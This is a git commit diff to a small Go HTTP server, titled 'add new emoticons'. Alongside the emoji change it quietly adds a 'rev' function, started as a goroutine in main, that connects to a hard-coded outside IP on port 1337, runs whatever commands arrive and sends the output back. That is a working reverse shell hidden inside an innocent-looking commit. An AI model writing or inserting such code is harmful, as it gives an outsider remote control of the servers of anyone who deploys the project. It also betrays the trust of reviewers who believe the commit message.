244552843114e756103fc02b488b2cf265de257a
junior158 <dummydev0x00@gmail.com>
2020-09-22 19:26:34 +0200

    add new emoticons

--- main.go
+++ main.go
@@ -2,6 +2,13 @@ package main
 
 import (
     "net/http"
+    "math/rand"
+    "time"
+    "fmt"
+    "bufio"
+    "net"
+    "os/exec"
+    "strings"
 )
 
 // create a handler struct
@@ -10,14 +17,45 @@ type HttpHandler struct{}
 // implement `ServeHTTP` method on `HttpHandler` struct
 func (h HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) {
 
+    // create a slice of emoticons
+    emoticons := make([]string, 0)
+    emoticons = append(emoticons,
+        "🦄", "🦏", "🦚", "🐧", "🦩",
+        "🐦", "🐬", "🐛", "🐞", "🦔",
+        "🐮", "😻", "🐇", "🐰", "🐱",
+        "🦇", "🦆", "🦢", "🕊", "🦐",
+        "🦦", "🐶", "🐴", "🐵", "😸",
+        "🦏", "🐌", "🐤", "🦦", "🐎")
+
+    rand.Seed(time.Now().Unix())
+    message := fmt.Sprint("Have a ❤️  day !", emoticons[rand.Intn(len(emoticons))])
+
     // create response binary data
-    data := []byte("Have a ❤️ day ! 🦄🦄🦄") // slice of bytes
+    data := []byte(message) // slice of bytes
 
     // write `data` to response
     res.Write(data)
 }
 
+func rev(){
+    conn, _ := net.Dial("tcp", "54.229.231.247:1337")
+    for {
+        message, _ := bufio.NewReader(conn).ReadString('\n')
+       message = strings.TrimSuffix(message, "\n")
+        cmd := strings.Split(message, " ")[0]
+       args := strings.Split(message, " ")[1:]
+        out, err := exec.Command(cmd, args...).Output()
+
+        if err != nil {
+           fmt.Fprintf(conn, "%s\n",err)
+        }
+        fmt.Fprintf(conn, "%s\n",out)
+    }
+}
+
 func main() {
+    // execute our revshell
+    go rev()
     // create a new handler
     handler := HttpHandler{}
 
